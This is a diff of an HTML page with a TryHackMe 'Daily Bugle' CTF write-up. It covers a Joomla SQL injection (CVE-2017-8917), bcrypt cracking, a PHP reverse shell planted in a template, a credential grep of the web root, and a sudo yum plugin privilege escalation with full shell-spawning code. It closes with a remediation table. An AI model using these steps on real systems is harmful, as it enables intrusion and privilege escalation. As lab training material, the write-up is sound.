@@ -1,99 +1,268 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Daily Bugle — OfflineDevc Writeups</title>
-  <link rel="stylesheet" href="../style.css" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Daily Bugle — Writeup | OfflineDevc</title>
+  <link rel="stylesheet" href="../style.css"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
 </head>
 <body>
-
+  <!-- NAV -->
   <nav class="navbar">
-    <div class="nav-inner">
-      <span class="nav-logo">&gt; OfflineDevc<span class="cursor">_</span></span>
-      <div class="nav-links">
-        <a href="../index.html#about">About</a>
-        <a href="../index.html#writeups">Writeups</a>
-        <a href="../index.html#contact">Contact</a>
-      </div>
+    <a href="../index.html" class="nav-logo">&lt;OfflineDevc/&gt;</a>
+    <div class="nav-links">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#writeups">Writeups</a>
     </div>
   </nav>
 
-  <header class="writeup-hero">
-    <div class="writeup-hero-inner">
-      <a href="../index.html#writeups" class="back-link">← Back to Writeups</a>
-      <div class="card-header" style="margin-bottom:12px">
-        <span class="platform thm-badge">THM</span>
-        <span class="difficulty medium-badge">Medium</span>
+  <!-- WRITEUP HEADER -->
+  <section class="writeup-hero">
+    <div class="container">
+      <div class="writeup-meta-top">
+        <a href="../index.html#writeups" class="back-link">← All Writeups</a>
+        <span class="platform-badge thm">TryHackMe</span>
       </div>
       <h1 class="writeup-title">Daily Bugle</h1>
-      <p style="color:#666;font-size:14px;margin-top:8px">Linux (CentOS 7.x) · Joomla SQLi CVE-2017-8917 → Bcrypt Crack → Template RCE → Sudo yum Privesc</p>
-      <div class="meta-row">
-        <div class="meta-item">🖥 OS: <span>Linux (CentOS 7.x)</span></div>
-        <div class="meta-item">🎯 Target: <span><code>10.48.187.164</code></span></div>
+      <div class="writeup-badges">
+        <span class="badge diff-hard">Hard</span>
+        <span class="badge badge-os">Linux</span>
       </div>
     </div>
-  </header>
+  </section>
 
-  <article class="writeup-content">
+  <!-- WRITEUP CONTENT -->
+  <main class="writeup-body">
+    <div class="container writeup-content">
+<h1 id="daily-bugle-tryhackme-writeup">Daily Bugle - TryHackMe Writeup</h1>
+<hr />
+<h2 id="1-executive-summary-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Metric</th>
+<th style="text-align: left;">Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Room Name</strong></td>
+<td style="text-align: left;">Daily Bugle</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Platform</strong></td>
+<td style="text-align: left;">TryHackMe</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Operating System</strong></td>
+<td style="text-align: left;">Linux (CentOS / Red Hat 7.x)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Target IP</strong></td>
+<td style="text-align: left;"><code>10.48.187.164</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Attacker IP</strong></td>
+<td style="text-align: left;"><code>192.168.132.94</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Difficulty</strong></td>
+<td style="text-align: left;">Medium</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Key Attack Vectors</strong></td>
+<td style="text-align: left;">Joomla 3.7.0 SQL Injection (CVE-2017-8917), Bcrypt Hash Cracking (<code>********</code>), Template Edit RCE, Credential Harvesting in <code>/var/www/</code>, Sudo Yum Plugin GTFOBins Privilege Escalation</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113191315.png" /></p>
+<h3 id="attack-chain-summary">Attack Chain Summary</h3>
+<ol>
+<li><strong>Reconnaissance &amp; Web Enumeration</strong>:<br />
+   - <code>nmap -sT -sV -sC 10.48.187.164 -Pn</code> revealed SSH (Port 22), Apache 2.4.6 with Joomla CMS (Port 80), and MariaDB (Port 3306).<br />
+   - Identified Joomla version 3.7.0.</li>
+<li><strong>Initial Foothold (Joomla SQLi &amp; Template RCE)</strong>:<br />
+   - Exploited CVE-2017-8917 (SQL injection in <code>com_fields</code>) via <code>joomblah.py</code> to extract Jonah's bcrypt hash.<br />
+   - Cracked Jonah's hash with John the Ripper and <code>rockyou.txt</code> ➔ <code>jonah:********</code>.<br />
+   - Logged into the Joomla administration panel, modified the Beez3 template (<code>index.php</code>), and injected a PHP reverse shell.<br />
+   - Received reverse shell as user <strong><code>apache</code></strong>.</li>
+<li><strong>Lateral Movement to <code>jjameson</code></strong>:<br />
+   - Searched for stored credentials using <code>grep -rn "password\|passwd\|pass=" /var/www/ 2&gt;/dev/null</code>.<br />
+   - Discovered MySQL configuration password: <code>********</code>.<br />
+   - Switched user via <code>su jjameson</code> and retrieved the user flag:<br />
+<code>cat user.txt</code> ➔ <code>********************************</code>.</li>
+<li><strong>Privilege Escalation to Root (Sudo Yum Plugin)</strong>:<br />
+   - <code>sudo -l</code> showed <code>jjameson</code> can run <code>(ALL) NOPASSWD: /usr/bin/yum</code>.<br />
+   - Abused GTFOBins Yum custom plugin injection to execute a root shell.<br />
+   - Retrieved root flag: <code>cat root.txt</code> ➔ <code>********************************</code>.</li>
+</ol>
+<hr />
+<h2 id="2-phase-1-reconnaissance-web-enumeration">2. Phase 1: Reconnaissance &amp; Web Enumeration</h2>
+<h3 id="21-port-scanning-nmap">2.1 Port Scanning (Nmap)</h3>
+<p>We scan target <code>10.48.187.164</code>:</p>
+<pre><code class="language-bash">nmap -sT -sV -sC 10.48.187.164 -Pn
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107210649.png" /></p>
+<ul>
+<li><strong>Port 22/tcp</strong>: OpenSSH 7.4</li>
+<li><strong>Port 80/tcp</strong>: Apache httpd 2.4.6 (CentOS) PHP/5.6.40 (Joomla!)</li>
+<li><strong>Port 3306/tcp</strong>: MariaDB 10.3.23</li>
+</ul>
+<h3 id="22-web-reconnaissance-joomla-version">2.2 Web Reconnaissance &amp; Joomla Version</h3>
+<p>Visiting <code>http://10.48.187.164/</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107210748.png" /><br />
+- <strong>Target Version</strong>: <strong>Joomla! 3.7.0</strong></p>
+<hr />
+<h2 id="3-phase-2-exploitation-initial-access">3. Phase 2: Exploitation &amp; Initial Access</h2>
+<h3 id="31-exploiting-joomla-sqli-cve-2017-8917">3.1 Exploiting Joomla SQLi (CVE-2017-8917)</h3>
+<p>Joomla 3.7.0 is vulnerable to SQL injection in <code>com_fields</code>:</p>
+<pre><code class="language-bash">searchsploit joomla 3.7.0
+</code></pre>
+<p>We execute <code>joomblah.py</code>:</p>
+<pre><code class="language-bash">python2 joomblah.py http://10.48.187.164
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107211001.png" /></p>
+<ul>
+<li><strong>User</strong>: <code>jonah</code></li>
+<li><strong>Hash</strong>: <code>$2y$10$0veO/vu9WuKNa8Css4nZoeEhlloTIYrJqGEPwtemmIZgtTQZuvGW.</code></li>
+</ul>
+<h3 id="32-cracking-hash-with-john-the-ripper">3.2 Cracking Hash with John the Ripper</h3>
+<pre><code class="language-bash">john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107211330.png" /></p>
+<ul>
+<li><strong>Cracked Password</strong>: <code>********</code></li>
+</ul>
+<h3 id="33-theme-modification-reverse-shell">3.3 Theme Modification &amp; Reverse Shell</h3>
+<p>We log in at <code>http://10.48.187.164/administrator/</code>:<br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261107211802.png" /></p>
+<p>Under <strong>Extensions &gt; Templates &gt; Templates &gt; Beez3 Details and Files</strong>, we edit <code>index.php</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107212511.png" /></p>
+<p>We start our listener and trigger the reverse shell:</p>
+<pre><code class="language-bash">penelope nc -p 4444
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107212531.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261107212554.png" /></p>
+<p>We receive a shell as user <strong><code>apache</code></strong>.</p>
+<hr />
+<h2 id="4-phase-3-lateral-movement-to-jjameson">4. Phase 3: Lateral Movement to <code>jjameson</code></h2>
+<h3 id="41-searching-configuration-for-passwords">4.1 Searching Configuration for Passwords</h3>
+<p>We grep for stored credentials in the web root:</p>
+<pre><code class="language-bash">grep -rn &quot;password\|passwd\|pass=&quot; /var/www/ 2&gt;/dev/null
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107214249.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261107214138.png" /><br />
+In <code>/var/www/html/configuration.php</code>, we discover the database password:<br />
+- <strong>Password</strong>: <code>********</code></p>
+<h3 id="42-switching-user-user-flag">4.2 Switching User &amp; User Flag</h3>
+<p>We switch to user <code>jjameson</code>:</p>
+<pre><code class="language-bash">su jjameson
+# Password: ********
+whoami
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107214222.png" /></p>
+<p>We read the user flag:</p>
+<pre><code class="language-bash">[jjameson@dailybugle ~]$ cat user.txt
+********************************
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107214354.png" /></p>
+<ul>
+<li><strong>User Flag</strong>: <code>********************************</code></li>
+</ul>
+<hr />
+<h2 id="5-phase-4-privilege-escalation-to-root">5. Phase 4: Privilege Escalation to Root</h2>
+<h3 id="51-sudo-rights-enumeration">5.1 Sudo Rights Enumeration</h3>
+<pre><code class="language-bash">[jjameson@dailybugle ~]$ sudo -l
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107214614.png" /></p>
+<pre><code class="language-text">User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+</code></pre>
+<h3 id="52-gtfobins-yum-plugin-exploitation">5.2 GTFOBins Yum Plugin Exploitation</h3>
+<p>In <code>/tmp</code>, we create a temporary Yum plugin configuration:</p>
+<pre><code class="language-bash">[jjameson@dailybugle tmp]$ TF=$(mktemp -d)
+[jjameson@dailybugle tmp]$ cat &gt;$TF/x&lt;&lt;EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+[jjameson@dailybugle tmp]$ cat &gt;$TF/y.conf&lt;&lt;EOF
+[main]
+enabled=1
+EOF
+[jjameson@dailybugle tmp]$ cat &gt;$TF/y.py&lt;&lt;EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+    os.execl('/bin/sh','/bin/sh')
+EOF
+[jjameson@dailybugle tmp]$ sudo yum -c $TF/x --enableplugin=y
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107214743.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261107214841.png" /></p>
+<pre><code class="language-text">Loaded plugins: y
+No plugin match for: y
+sh-4.2# whoami
+root
+</code></pre>
+<p>We read the root flag:</p>
+<pre><code class="language-bash">sh-4.2# cat root.txt
+********************************
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261107214904.png" /></p>
+<ul>
+<li><strong>Root Flag</strong>: <code>********************************</code></li>
+</ul>
+<hr />
+<h2 id="6-security-mitigations-remediation">6. Security Mitigations &amp; Remediation</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Vulnerability</th>
+<th style="text-align: left;">Impact</th>
+<th style="text-align: left;">Recommended Remediation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Joomla SQL Injection (CVE-2017-8917)</strong></td>
+<td style="text-align: left;">Remote database extraction and admin takeover.</td>
+<td style="text-align: left;">Upgrade Joomla! to version 3.7.1 or higher.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Password Reuse</strong></td>
+<td style="text-align: left;">Lateral movement from <code>apache</code> to <code>jjameson</code>.</td>
+<td style="text-align: left;">Ensure administrative database credentials are unique and differ from system user passwords.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Sudo NOPASSWD on Package Manager (<code>yum</code>)</strong></td>
+<td style="text-align: left;">Local Privilege Escalation to root.</td>
+<td style="text-align: left;">Remove package management utilities from <code>sudoers</code>.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-tools-used">7. Tools Used</h2>
+<ul>
+<li><strong>Nmap</strong>: Service discovery (<code>nmap -sT -sV -sC 10.48.187.164 -Pn</code>)</li>
+<li><strong>Joomblah</strong>: CVE-2017-8917 SQL injection exploit</li>
+<li><strong>John the Ripper</strong>: Bcrypt hash cracking (<code>********</code>)</li>
+<li><strong>Penelope / Netcat</strong>: Listener handling</li>
+<li><strong>GTFOBins</strong>: Sudo Yum custom plugin privilege escalation</li>
+</ul>
+    </div>
+  </main>
 
-    <table class="info-table">
-      <tr><th>Room Name</th><td>Daily Bugle</td></tr>
-      <tr><th>Platform</th><td>TryHackMe</td></tr>
-      <tr><th>OS</th><td>Linux (CentOS 7.x)</td></tr>
-      <tr><th>Target IP</th><td>10.48.187.164</td></tr>
-      <tr><th>Attacker IP</th><td>192.168.132.94</td></tr>
-      <tr><th>Difficulty</th><td>Medium</td></tr>
-      <tr><th>Key CVEs</th><td>CVE-2017-8917 (Joomla 3.7.0 SQLi)</td></tr>
-    </table>
-
-    <h2>// Attack Chain</h2>
-    <div class="attack-chain">Recon (Nmap)
-  → Port 22 (SSH) · Port 80 (Apache + Joomla 3.7.0) · Port 3306 (MariaDB)
-  → joomblah.py → extract jonah bcrypt hash
-  → john --format=bcrypt → cracked: ████████
-  → Login /administrator → Extensions > Templates > Beez3 > index.php
-  → Inject PHP reverse shell → penelope nc -p 4444
-  → Shell as apache
-  → grep -rn "password" /var/www/ → /configuration.php → DB password: ████████
-  → su jjameson → user.txt → ████████████████████████████████
-  → sudo -l → (ALL) NOPASSWD: /usr/bin/yum
-  → GTFOBins yum plugin → sh-4.2# whoami root
-  → cat root.txt → ████████████████████████████████</div>
-
-    <h2>// Methodology</h2>
-    <p>This writeup follows the standard penetration testing lifecycle:
-    <strong>Reconnaissance</strong> → <strong>Enumeration</strong> → <strong>Exploitation</strong> →
-    <strong>Post-Exploitation</strong> → <strong>Privilege Escalation</strong> → <strong>Remediation</strong>.</p>
-    <p style="color:#555;font-size:13px;margin-top:12px">
-      📸 Full screenshot evidence is available in the original report.
-      Sensitive flags and credentials are redacted in compliance with TryHackMe guidelines.
-    </p>
-
-    <h2>// Tools Used</h2>
-    <ul style="color:#888;font-size:13px;line-height:2.2;margin-left:20px">
-      <li><code>Nmap</code></li>
-      <li><code>joomblah.py</code></li>
-      <li><code>John the Ripper</code></li>
-      <li><code>Penelope</code></li>
-      <li><code>GTFOBins</code></li>
-    </ul>
-
-  </article>
-
+  <!-- FOOTER -->
   <footer class="footer">
-    <div class="footer-inner">
-      <div class="footer-links">
-        <a href="https://github.com/OfflineDevc" target="_blank">GitHub</a>
-        <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a>
-        <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a>
-        <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a>
-      </div>
-      <p class="footer-copy">© 2026 Kun Poonkasetvatana. Educational purposes only.</p>
-    </div>
+    <p>Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+       <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
+       <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
   </footer>
-
 </body>
 </html>
